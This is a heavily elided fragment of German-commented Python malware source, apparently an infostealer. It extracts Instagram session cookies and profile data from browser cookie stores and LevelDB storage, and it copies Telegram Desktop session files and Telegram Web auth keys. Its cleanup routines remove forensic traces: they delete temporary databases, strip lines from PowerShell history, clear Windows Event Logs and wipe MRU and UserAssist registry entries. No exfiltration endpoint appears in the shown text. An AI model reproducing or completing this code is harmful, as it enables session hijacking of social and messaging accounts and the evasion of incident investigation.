...
'''
        ...
        try:
            ...
            def extract_instagram_browser_sessions():
                ...
                for browser_name, browser_info in browsers.items():
                    ...
                    # Encryption Key für Chromium-basierte Browser
                    master_key = None
                            ...
                            try:
                                ...
                                for cookie in cookies:
                                    ...
                                    if decrypted_value:
                                        ...
                                        # Wichtige Session-Daten extrahieren
                                        if name == 'sessionid':
                                        ...
                                        if file.endswith(('.ldb', '.log')):
                                            ...
                                            try:
                                                with open(file_path, 'r', errors='ignore') as f:
                                                    ...
                                                    # Instagram-spezifische Daten suchen
                                                    ig_patterns = [
                                                        r'"username":"([^"]+)"',
                                                        r'"full_name":"([^"]+)"',
                                                        r'"profile_pic_url":"([^"]+)"',
            ...
            # Instagram Desktop App (falls installiert)
    ...
    def telegram(self):
        try:
            ...
            # Telegram Desktop Daten extrahieren
                ...
                for tg_path in telegram_paths:
                    if os.path.exists(tg_path):
                        try:
                            ...
                            # Session-Dateien und Konfigurationen sammeln
                            for item in os.listdir(tg_path):
                                item_path = os.path.join(tg_path, item)
                                
                                if os.path.isfile(item_path):
                                    # Session-Dateien (meist ohne Erweiterung oder mit spezifischen Namen)
            ...
            # Telegram Web Sessions aus Browsern
            def extract_telegram_web_sessions():
                ...
                for browser_name, browser_info in browsers.items():
                    ...
                    for profile in browser_info['profiles']:
                        ...
                        # Local Storage für Telegram Web
                        local_storage_path = os.path.join(profile_path, "Local Storage", "leveldb")
                        if os.path.exists(local_storage_path):
                            try:
                                session_data = {
                                    ...
                                    if file.endswith(('.ldb', '.log')):
                                        ...
                                        try:
                                            with open(file_path, 'r', errors='ignore') as f:
                                                ...
                                                # Telegram Web spezifische Patterns
                                                tg_patterns = [
                                                    r'telegram.*auth.*key',
                                                    r'telegram.*session',
                                                    r'telegram.*user.*id',
                        ...
                        if os.path.exists(cookies_path):
                            try:
                                ...
                                if telegram_cookies:
                                    # Session zu bestehender hinzufügen oder neue erstellen
    ...
    def cleanup(self):
        try:
            ...
            # Erweiterte Bereinigung - Temporäre Dateien und Spuren entfernen
    ...
    def cleanup_temp_files(self):
        """Bereinigt temporäre Dateien und Ordner"""
        try:
            temp_dirs = [
                os.getenv("TEMP"),
                os.getenv("TMP"),
            ...
            # Temporäre Dateien mit spezifischen Mustern löschen
            temp_patterns = [
                "*_login_*.db",
                "*_history_*.db", 
                "*_webdata*.db",
    ...
    def cleanup_browser_traces(self):
        """Bereinigt Browser-Spuren und temporäre Datenbanken"""
        try:
            # Browser-spezifische temporäre Dateien
    ...
    def cleanup_system_traces(self):
        """Bereinigt System-Spuren und Logs"""
        try:
            # Prefetch-Dateien bereinigen (falls vorhanden)
            ...
            for ps_history in ps_history_paths:
                if os.path.exists(ps_history):
                    try:
                        ...
                        # Zeilen mit verdächtigen Inhalten entfernen
                        cleaned_lines = []
                        for line in lines:
            ...
            # Windows Event Logs bereinigen (falls möglich)
            try:
    ...
    def cleanup_registry_traces(self):
        """Bereinigt Registry-Spuren"""
        try:
            # MRU (Most Recently Used) Listen bereinigen
            mru_keys = [
            ...
            # UserAssist-Einträge bereinigen
            try:
